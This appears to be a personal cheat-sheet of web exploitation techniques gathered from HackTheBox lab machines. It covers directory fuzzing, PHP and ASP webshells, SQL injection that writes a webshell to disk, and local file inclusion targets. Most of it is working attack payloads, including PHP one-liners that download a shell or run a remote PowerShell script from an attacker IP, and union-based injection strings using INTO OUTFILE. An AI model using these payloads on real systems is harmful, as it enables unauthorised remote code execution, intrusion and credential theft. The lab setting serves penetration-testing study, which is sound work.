# Web exploitation

## Enumerating Web dirs.

1. URLs are case-sensitive for Linux webservers but not Windows. [Ref](https://webmasters.stackexchange.com/questions/90339/why-are-urls-case-sensitive)

### wfuzz exclude specified response length
```text
root@kali:~/CTF/HTB/Bart# wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.81/FUZZ -H "Host: bart.htb" --hc 400 --hh 0,150693
 /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.81/FUZZ
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000067:   301        1 L      10 W       145 Ch      "forum"
000001515:   301        1 L      10 W       147 Ch      "monitor"

Total time: 0
Processed Requests: 207643
Filtered Requests: 207641
Requests/sec.: 0
```



## PHP webshell

```php
<?php system($_REQUEST ['cmd']); ?>
```

Or consider adding a simple echo to make sure system() isn't blocked

```php
<?php echo Test; echo system($_REQUEST ['cmd']); ?>
```

A stripped down PHP webshell would be

```php
<?=`whoami`?>
```

Or alternatively, have it download a file to directory served by the Webserver

```php
# Linux
<?php exec("wget http://10.10.14.78/shell.php -O /var/www/html/shell.php"); ?>
# Windows
<?php exec("powershell.exe IEX(IWR http://10.10.14.78/rshell.ps1 -UseBasicParsing)"); ?>
```
## ASP webshell

Start with simple ones like this asp one or [this](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp) (worked for Conceal)

```asp
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Look for [webshells here](https://github.com/tennc/webshell).

## Downloading image files

`wget`, unlike Firefox doesn't strip out metadata from image files. So this preserves some additional `exiftool` data like file modified dates.

## Virtual host config

1. When you have `Assign User-ID` in vhost config and a shell, can upload a Webshell to achieve RCE under a different user, see OpenAdmin for eg.

## SQL Injection

Can try
```plaintext
?cod=1+2
```
to see if SQL actually evaluates the math to load `?cod=3`

### group_concat

Can group output with group_concat with 
`group_concat(TABLE_NAME,":",COLUMN_NAME,)`
to show

```
db:User
db:Host
```

### LOAD_FILE() LFI

May want to wrap `LOAD_FILE()` with `TO_base64(LOAD_FILE("/etc/passwd"))` so that it it converts everything to base64 instead of trying to display it which may execute code and prevent displaying.

Consider LFI to view PHP code containing MySQL password in plaintext instead of 
```sql
SELECT user FROM mysql.user;
```
which requires the Web app user be sufficiently privileged to query that.

### Write shell into file
Using `OUTFILE()`
```text
productName=999' UNION ALL SELECT "<?php system($_REQUEST ['cmd']); ?>",null,null,null,null,null INTO OUTFILE "C:/inetpub/wwwroot/webshell.php";-- -
```
Or `DUMPFILE()` which has fewer bad chars
```text
productName=999' UNION ALL SELECT "<?php system($_REQUEST ['cmd']); ?>",null,null,null,null,null INTO DUMPFILE "C:/inetpub/wwwroot/webshell.php";-- -
```

## PHP

### PHP restrictions

`phpinfo()` let's you see which PHP functions are disabled. You may be able to find ways to bypass them by Googling "bypass PHP disable functions". To test whether PHP RCE is possible you may want to do a simple `echo` instead of `system()` or `exec()` because those could be blocked while most others work.

```php
<?php echo("Testing"); ?>
```

## LFI

#### Linux

1. **/proc/self/status**  - See UID/GID of Web user,

2. **/proc/self/environ**  - View `env`

3. **/etc/os-release** - Check distro

Also see if you can view **/var/log/apache2/error.log** or **/var/log/apache2/access.log** for log poisoning eg. HTB Poison.

#### Windows

Typically check

1.  C:\Windows\win.ini 
2. C:\WINDOWS\System32\drivers\etc\hosts